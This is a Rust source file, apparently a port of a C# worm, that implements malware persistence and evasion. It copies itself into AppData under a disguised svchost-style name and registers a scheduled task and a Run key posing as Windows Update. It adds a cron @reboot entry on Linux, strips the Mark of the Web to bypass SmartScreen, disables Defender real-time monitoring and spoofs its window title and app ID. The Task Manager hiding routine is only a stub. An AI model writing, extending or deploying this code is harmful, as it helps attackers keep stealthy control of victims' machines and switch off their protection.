// registry.rs — Rust port of Registry.cs (Startup + AdvancedWormStarter)
// Persistence, SmartScreen bypass, process renaming, Defender disabling,
// and Task Manager hiding.

use std::fs;
#[cfg(target_os = "windows")]
use std::path::PathBuf;
use std::process::Command;
#[cfg(target_os = "windows")]
use std::os::windows::process::CommandExt;
use log::info;

const FAKE_PROCESS_NAME: &str = "svchost_update.exe";
#[allow(dead_code)]
const TASK_NAME: &str = "WindowsUpdateHelper";

pub struct Startup;

impl Startup {
    /// Copies self to AppData and creates a scheduled task for persistence.
    pub fn persist() {
        let current_exe = match std::env::current_exe() {
            Ok(p) => p.to_string_lossy().to_string(),
            Err(_) => return,
        };

        #[cfg(target_os = "windows")]
        {
            let appdata = std::env::var("APPDATA").unwrap_or_default();
            let appdata_path = PathBuf::from(&appdata).join(FAKE_PROCESS_NAME);
            let appdata_str = appdata_path.to_string_lossy().to_string();

            // Only copy if not already running from persisted location
            if !current_exe.eq_ignore_ascii_case(&appdata_str) {
                if !appdata_path.exists() {
                    let _ = fs::copy(&current_exe, &appdata_path);
                }
            }

            // Create Scheduled Task
            let _ = Command::new("schtasks")
                .args(&[
                    "/Create", "/TN", TASK_NAME,
                    "/TR", &format!("\"{}\"", appdata_str),
                    "/SC", "ONLOGON", "/RL", "HIGHEST", "/F",
                ])
                .creation_flags(0x08000000) // CREATE_NO_WINDOW
                .output();

            // Backup: add to HKCU Run via reg.exe
            let _ = Command::new("reg")
                .args(&[
                    "add",
                    r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
                    "/v", "WindowsUpdate",
                    "/t", "REG_SZ",
                    "/d", &format!("\"{}\"", appdata_str),
                    "/f",
                ])
                .creation_flags(0x08000000)
                .output();

            info!("[+] Persistence set up.");
        }

        #[cfg(not(target_os = "windows"))]
        {
            // Linux persistence via cron
            let home = std::env::var("HOME").unwrap_or_default();
            let persist_path = format!("{}/.local/bin/{}", home, FAKE_PROCESS_NAME);
            let _ = fs::create_dir_all(format!("{}/.local/bin", home));
            let _ = fs::copy(&current_exe, &persist_path);
            let _ = Command::new("chmod").args(&["+x", &persist_path]).output();

            // Add to crontab
            let cron_entry = format!("@reboot {}", persist_path);
            if let Ok(output) = Command::new("crontab").arg("-l").output() {
                let existing = String::from_utf8_lossy(&output.stdout).to_string();
                if !existing.contains(&persist_path) {
                    let new_cron = format!("{}\n{}\n", existing.trim(), cron_entry);
                    let _ = Command::new("sh")
                        .args(&["-c", &format!("echo '{}' | crontab -", new_cron)])
                        .output();
                }
            }

            info!("[+] Persistence set up (cron).");
        }
    }

    /// Removes Zone.Identifier ADS (Mark of the Web) to bypass SmartScreen.
    pub fn bypass_smart_screen() {
        #[cfg(target_os = "windows")]
        {
            if let Ok(exe) = std::env::current_exe() {
                let zone_file = format!("{}:Zone.Identifier", exe.display());
                let _ = Command::new("cmd.exe")
                    .args(&["/c", &format!("echo. > \"{}\"", zone_file)])
                    .creation_flags(0x08000000)
                    .output();
            }
        }
    }

    /// Renames the process window title to appear legitimate.
    pub fn rename_process() {
        #[cfg(target_os = "windows")]
        {
            // Set console title
            extern "system" {
                fn SetConsoleTitleW(title: *const u16) -> i32;
            }
            let title: Vec<u16> = "Windows Update Helper\0".encode_utf16().collect();
            unsafe { SetConsoleTitleW(title.as_ptr()); }
        }
    }

    /// Attempts to disable Windows Defender Real-Time Protection.
    pub fn disable_windows_defender() {
        #[cfg(target_os = "windows")]
        {
            let _ = Command::new("powershell.exe")
                .args(&[
                    "-NoProfile", "-NonInteractive", "-Command",
                    "Set-MpPreference -DisableRealtimeMonitoring $true",
                ])
                .creation_flags(0x08000000)
                .output();
        }
    }

    /// Attempts to hide the process from Task Manager.
    pub fn hide_process_from_task_manager() {
        AdvancedWormStarter::hide_from_task_manager_internal();
    }
}

// ==================== AdvancedWormStarter ====================

pub struct AdvancedWormStarter;

impl AdvancedWormStarter {
    #[allow(dead_code)]
    const APP_USER_MODEL_ID: &'static str = "Microsoft.Windows.Update.1.0";

    /// Sets AppUserModelId via Registry.
    pub fn set_app_user_model_id() {
        #[cfg(target_os = "windows")]
        {
            let _ = Command::new("reg")
                .args(&[
                    "add",
                    r"HKCU\Software\Classes\AppUserModelId",
                    "/v", FAKE_PROCESS_NAME,
                    "/t", "REG_SZ",
                    "/d", Self::APP_USER_MODEL_ID,
                    "/f",
                ])
                .creation_flags(0x08000000)
                .output();
        }
    }

    /// Attempts to hide from Task Manager using NtQuerySystemInformation.
    pub(crate) fn hide_from_task_manager_internal() {
        #[cfg(target_os = "windows")]
        {
            // NtQuerySystemInformation with SystemProcessInformation (class 5)
            // to find and unlink our process entry from the process list.
            // This is a simplified stub — full implementation requires
            // extensive unsafe memory manipulation.
            let _pid = std::process::id();
            // Would walk the SYSTEM_PROCESS_INFORMATION linked list
            // and unlink our entry
        }
    }
}
